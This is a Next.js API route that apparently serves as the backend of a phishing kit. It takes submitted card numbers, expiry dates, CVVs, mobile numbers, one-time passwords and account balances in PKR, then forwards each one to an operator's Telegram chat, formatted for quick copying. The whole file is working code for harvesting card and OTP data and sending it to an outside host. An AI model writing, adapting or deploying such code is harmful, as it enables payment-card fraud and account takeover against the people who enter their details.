import { NextResponse } from 'next/server'

// Escape values for Telegram HTML parse mode
function escapeHtml(value: string) {
  return value.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}

// Wrap a value in <code> so it is tap-to-copy inside Telegram
function copyable(value: string | number) {
  return `<code>${escapeHtml(String(value))}</code>`
}

export async function POST(request: Request) {
  const token = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID

  if (!token || !chatId) {
    return NextResponse.json({ ok: false, error: 'Telegram is not configured.' }, { status: 503 })
  }

  let text = ''
  try {
    const body = await request.json()

    if (body?.card || body?.month || body?.year || body?.cvv) {
      // Card submission
      const lines = [
        '<b>New card submission</b>',
        body?.card ? `Card: ${copyable(body.card)}` : null,
        body?.month || body?.year ? `Expiry: ${copyable(`${body?.month ?? '--'}/${body?.year ?? '----'}`)}` : null,
        body?.cvv ? `CVV: ${copyable(body.cvv)}` : null,
        body?.mobile ? `Mobile: ${copyable(body.mobile)}` : null,
      ].filter(Boolean)
      text = lines.join('\n')
    } else if (body?.mobile) {
      text = `<b>New mobile number</b>\nMobile: ${copyable(body.mobile)}`
    } else if (body?.otp) {
      text = `<b>OTP submitted</b>\nOTP: ${copyable(body.otp)}`
    } else if (body?.confirmOtp) {
      text = `<b>Confirm OTP submitted</b>\nOTP: ${copyable(body.confirmOtp)}`
    } else if (body?.balance) {
      text = `<b>Account balance submitted</b>\nBalance: ${copyable(`PKR ${body.balance}`)}`
    } else if (typeof body?.text === 'string' && body.text.trim()) {
      text = escapeHtml(body.text.trim())
    } else {
      const value = typeof body?.number === 'string' ? body.number : String(body?.number ?? '')
      const trimmed = value.trim()
      text = trimmed ? `New number submitted: ${copyable(trimmed)}` : ''
    }
  } catch {
    return NextResponse.json({ ok: false, error: 'Invalid request.' }, { status: 400 })
  }

  if (!text) {
    return NextResponse.json({ ok: false, error: 'Nothing to send.' }, { status: 400 })
  }

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
      }),
      cache: 'no-store',
    })

    if (!response.ok) {
      return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ ok: false, error: 'Failed to send to Telegram.' }, { status: 502 })
  }
}

export function GET() {
  return NextResponse.json({ ok: false }, { status: 405 })
}
